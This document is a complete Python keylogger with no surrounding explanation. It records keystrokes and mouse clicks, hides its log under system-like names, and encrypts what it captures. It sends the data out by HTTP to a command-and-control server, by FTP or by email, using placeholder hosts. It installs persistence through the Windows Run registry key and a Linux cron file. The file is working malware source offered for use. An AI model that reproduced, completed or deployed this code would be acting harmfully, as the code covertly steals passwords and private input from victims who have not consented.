#!/usr/bin/env python3
import os
import sys
import time
import threading
import smtplib
import ftplib
import socket
import base64
import zlib
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import pynput
from pynput import keyboard
from pynput import mouse
import requests
import json
from datetime import datetime

class AdvancedKeylogger:
    def __init__(self, encryption_key=None, c2_server="http://localhost:5000", exfiltration_method="ftp"):
        self.encryption_key = encryption_key or self.generate_encryption_key()
        self.cipher_suite = Fernet(self.encryption_key)
        self.c2_server = c2_server
        self.exfiltration_method = exfiltration_method
        self.log_buffer = []
        self.buffer_size = 100
        self.is_running = True
        
        # Stealth configurations
        self.hidden_file = os.path.join(os.getenv('TEMP') or os.getcwd(), 'system32_log.dat')
        self.mutex_name = "Global\\System32WinLogon"
        
    def generate_encryption_key(self):
        """Generate encryption key from system information"""
        system_id = f"{os.getenv('COMPUTERNAME')}{os.getenv('USERNAME')}"
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'system_salt',
            iterations=100000,
        )
        return base64.urlsafe_b64encode(kdf.derive(system_id.encode()))

    def encrypt_data(self, data):
        """Encrypt log data"""
        compressed = zlib.compress(data.encode())
        encrypted = self.cipher_suite.encrypt(compressed)
        return base64.b64encode(encrypted).decode()

    def decrypt_data(self, encrypted_data):
        """Decrypt log data"""
        encrypted = base64.b64decode(encrypted_data)
        decrypted = self.cipher_suite.decrypt(encrypted)
        return zlib.decompress(decrypted).decode()

    def on_key_press(self, key):
        """Capture key presses"""
        try:
            key_str = str(key).replace("'", "")
            
            # Special key handling
            if key == keyboard.Key.space:
                key_str = " [SPACE] "
            elif key == keyboard.Key.enter:
                key_str = " [ENTER]\n"
            elif key == keyboard.Key.backspace:
                key_str = " [BACKSPACE] "
            elif key == keyboard.Key.tab:
                key_str = " [TAB] "
            else:
                key_str = key_str.replace("Key.", "[") + "]"
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"{timestamp} - {key_str}"
            
            self.log_buffer.append(log_entry)
            
            # Write to hidden file
            with open(self.hidden_file, 'a', encoding='utf-8') as f:
                f.write(log_entry)
            
            # Send buffer when full
            if len(self.log_buffer) >= self.buffer_size:
                self.exfiltrate_data()
                
        except Exception as e:
            pass

    def on_click(self, x, y, button, pressed):
        """Capture mouse clicks"""
        if pressed:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"{timestamp} - [MOUSE_CLICK] at ({x}, {y}) with {button}\n"
            self.log_buffer.append(log_entry)

    def exfiltrate_data(self):
        """Send captured data to C2 server"""
        if not self.log_buffer:
            return
            
        try:
            log_data = "\n".join(self.log_buffer)
            encrypted_data = self.encrypt_data(log_data)
            
            if self.exfiltration_method == "http":
                response = requests.post(
                    f"{self.c2_server}/logs",
                    json={
                        'computer_id': os.getenv('COMPUTERNAME'),
                        'user': os.getenv('USERNAME'),
                        'logs': encrypted_data,
                        'timestamp': datetime.now().isoformat()
                    },
                    timeout=10
                )
                
            elif self.exfiltration_method == "ftp":
                # FTP exfiltration
                ftp = ftplib.FTP()
                ftp.connect('your-ftp-server.com', 21)
                ftp.login('username', 'password')
                
                filename = f"logs_{os.getenv('COMPUTERNAME')}_{int(time.time())}.enc"
                with open(filename, 'w') as f:
                    f.write(encrypted_data)
                
                ftp.storbinary(f"STOR {filename}", open(filename, 'rb'))
                ftp.quit()
                os.remove(filename)
                
            elif self.exfiltration_method == "email":
                # Email exfiltration
                self.send_email(encrypted_data)
            
            # Clear buffer after successful exfiltration
            self.log_buffer.clear()
            
        except Exception:
            # If exfiltration fails, keep data in buffer for next attempt
            pass

    def send_email(self, data):
        """Send logs via email"""
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login("your_email@gmail.com", "your_password")
            
            message = f"Subject: Keylogger Data\n\n{data}"
            server.sendmail("your_email@gmail.com", "recipient@gmail.com", message)
            server.quit()
        except Exception:
            pass

    def persist(self):
        """Add persistence to system"""
        try:
            if sys.platform == "win32":
                import winreg
                
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "WindowsSystem32", 0, winreg.REG_SZ, sys.executable)
                    
            elif sys.platform == "linux":
                # Add to crontab
                cron_job = f"@reboot python3 {os.path.abspath(__file__)}\n"
                with open("/etc/cron.d/systemd", "w") as f:
                    f.write(cron_job)
                    
        except Exception:
            pass

    def start(self):
        """Start the keylogger"""
        print("[+] Starting advanced keylogger...")
        
        # Add persistence
        self.persist()
        
        # Start keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        keyboard_listener.start()
        
        # Start mouse listener
        mouse_listener = mouse.Listener(on_click=self.on_click)
        mouse_listener.start()
        
        # Periodic exfiltration thread
        def periodic_exfiltration():
            while self.is_running:
                time.sleep(300)  # Every 5 minutes
                self.exfiltrate_data()
        
        exfil_thread = threading.Thread(target=periodic_exfiltration)
        exfil_thread.daemon = True
        exfil_thread.start()
        
        print("[+] Keylogger active and hidden")
        
        # Keep the main thread alive
        try:
            while self.is_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stop the keylogger"""
        self.is_running = False
        self.exfiltrate_data()  # Final exfiltration
        print("[+] Keylogger stopped")

if __name__ == "__main__":
    # Configuration - in real scenario, get from C2
    C2_SERVER = "http://your-c2-server.com:5000"
    
    keylogger = AdvancedKeylogger(
        c2_server=C2_SERVER,
        exfiltration_method="http"  # http, ftp, or email
    )
    keylogger.start()